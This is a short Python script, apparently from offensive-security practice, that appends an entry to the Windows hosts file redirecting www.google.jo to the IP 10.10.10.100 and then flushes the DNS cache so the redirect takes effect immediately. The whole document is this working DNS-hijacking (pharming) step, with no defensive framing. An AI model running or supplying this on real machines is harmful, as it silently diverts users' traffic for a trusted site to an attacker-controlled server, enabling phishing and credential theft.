import subprocess
import os

# change the script directory to ..\etc where the host file is located on windows
os.chdir("C:\Windows\System32\drivers\etc")

# appened a line to the host file, where it should redirect
# traffic going to google.jo to IP of 10.10.10.100
command = "echo 10.10.10.100 www.google.jo >> hosts"  
CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

# flush the cached dns, to make sure that new sessions will take the new DNS record
command = "ipconfig /flushdns" 
CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

